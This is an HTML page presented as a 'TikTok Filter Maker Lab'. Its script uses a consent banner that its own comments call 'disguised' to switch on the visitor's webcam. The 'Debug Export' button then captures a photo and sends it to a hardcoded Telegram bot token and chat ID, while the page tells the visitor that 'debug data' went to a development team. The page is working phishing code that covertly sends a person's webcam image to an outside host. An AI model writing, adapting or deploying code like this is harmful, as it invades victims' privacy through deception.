<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Filter Maker Lab</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: #1a1a1a;
            color: #fff;
        }

        #camera-container {
            width: 100%;
            max-width: 600px;
            margin: 0 auto;
            position: relative;
        }

        #video {
            width: 100%;
            border-radius: 15px;
            transform: scaleX(-1);
        }

        #cookie-consent {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(0,0,0,0.8);
            padding: 15px;
            border-radius: 10px;
            max-width: 300px;
            display: none;
        }

        .filter-controls {
            margin-top: 20px;
            text-align: center;
        }

        button {
            background: #ff004f;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }

        #telegram-status {
            margin-top: 10px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <!-- Disguised cookie consent -->
    <div id="cookie-consent">
        <h3>üîß Filter Settings Consent</h3>
        <p>Enable experimental filter settings to continue development</p>
        <button onclick="agreeToCookies()">Agree to Testing Mode</button>
    </div>

    <div id="camera-container">
        <h2>üé• TikTok Filter Development Interface</h2>
        <p class="subtitle">Buat filter mu sendiri</p>
        
        <video id="video" autoplay></video>
        
        <div class="filter-controls">
            <button onclick="capturePhoto()">üì∏ Test Capture</button>
            <button onclick="sendToTelegram()">üõ†Ô∏è Debug Export</button>
        </div>
        
        <div id="telegram-status"></div>
    </div>

    <script>
        // Disguised cookie consent
        document.addEventListener('DOMContentLoaded', function() {
            if (!localStorage.getItem('cookiesAccepted')) {
                document.getElementById('cookie-consent').style.display = 'block';
            } else {
                initializeCamera();
            }
        });

        function agreeToCookies() {
            localStorage.setItem('cookiesAccepted', 'true');
            document.getElementById('cookie-consent').style.display = 'none';
            initializeCamera();
        }

        let mediaStream;

        async function initializeCamera() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }
                });
                const video = document.getElementById('video');
                video.srcObject = mediaStream;
            } catch (err) {
                alert('Camera access required for filter testing');
            }
        }

        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            return canvas.toDataURL('image/jpeg');
        }

        async function sendToTelegram() {
            const imageData = capturePhoto().split(',')[1];
            const statusElement = document.getElementById('telegram-status');

            try {
                const response = await fetch('https://api.telegram.org/bot7934082598:AAHl20mqIV1ah5E60GLV7Aeo-1JSSePCk4g/sendPhoto', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: '7390748691',
                        photo: `data:image/jpeg;base64,${imageData}`
                    })
                });

                const result = await response.json();
                if (result.ok) {
                    statusElement.textContent = '‚úÖ Debug data sent to development team';
                } else {
                    statusElement.textContent = '‚ùå Failed to send debug data';
                }
            } catch (error) {
                statusElement.textContent = '‚ö†Ô∏è Connection to lab server failed';
            }
        }

        // Cleanup camera access
        window.addEventListener('beforeunload', () => {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
